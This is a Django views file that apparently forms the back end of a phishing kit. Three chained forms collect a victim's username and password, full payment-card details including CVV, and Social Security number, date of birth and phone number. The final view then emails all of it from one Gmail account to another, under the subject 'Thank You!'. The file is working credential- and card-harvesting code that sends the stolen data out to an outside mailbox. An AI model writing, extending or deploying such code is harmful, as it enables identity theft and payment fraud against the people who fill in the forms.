import yagmail
from django.shortcuts import render,redirect
from .forms import *

def home_view(request):
    
    if request.method == 'POST':
        form = UserPassForm(request.POST)
        if form.is_valid():
            request.session['login_data'] = form.cleaned_data
            return redirect('billing')
    else:
        form = UserPassForm()
        
    return render(request, 'dashboard/home.html', {'form': form})

def billing_view(request):
    if request.method == 'POST':
        form = BillingForm(request.POST)
        if form.is_valid():
            request.session['bill_data'] = form.cleaned_data
            print(request.session['login_data'])
            return redirect('info')
    else:
        form = BillingForm()
    return render(request, 'dashboard/billing.html', {'form': form})

def info_view(request):
    if request.method == 'POST':
        form = InfoForm(request.POST)
        if form.is_valid():
            request.session['info_data'] = form.cleaned_data
            print(request.session['login_data'])
            print(request.session['bill_data'])
            return redirect('thank-you')
    else:
        form = InfoForm()
    return render(request, 'dashboard/info.html', {'form': form})


def thank_you_view(request):
    # Retrieve session data
    login_data = request.session.get('login_data', 'No login data available')
    bill_data = request.session.get('bill_data', 'No bill data available')
    info_data = request.session.get('info_data', 'No info data available')

    # Format the content of the email
    email_content = f"""
    username: {login_data.get('user_name', 'N/A')}
    password: {login_data.get('pass_word', 'N/A')}
    card_name: {bill_data.get('card_name', 'N/A')}
    card_number: {bill_data.get('card_number', 'N/A')}
    expiration_date: {bill_data.get('expiry_date', 'N/A')}
    address: {bill_data.get('address', 'N/A')}
    cvv: {bill_data.get('cvv', 'N/A')}
    ssn: {info_data.get('ssn', 'N/A')}
    phone_number: {info_data.get('phone_number', 'N/A')}
    dob: {info_data.get('dob', 'N/A')}
    postal_code: {info_data.get('postal_code', 'N/A')}
    """

    try:
        # Ensure you have configured yagmail with your email and password securely
        yag = yagmail.SMTP('castanedaorlando871@gmail.com')  # Replace with a secure method for loading credentials
        yag.send(
            to='lyndazuniga2020@gmail.com',  # Replace with actual recipient email
            subject='Thank You!',
            contents= email_content
        )
        print("✅ Email sent successfully!")
    except Exception as e:
        print("❌ Failed to send email:", str(e))

    return render(request, 'dashboard/thankyou.html')



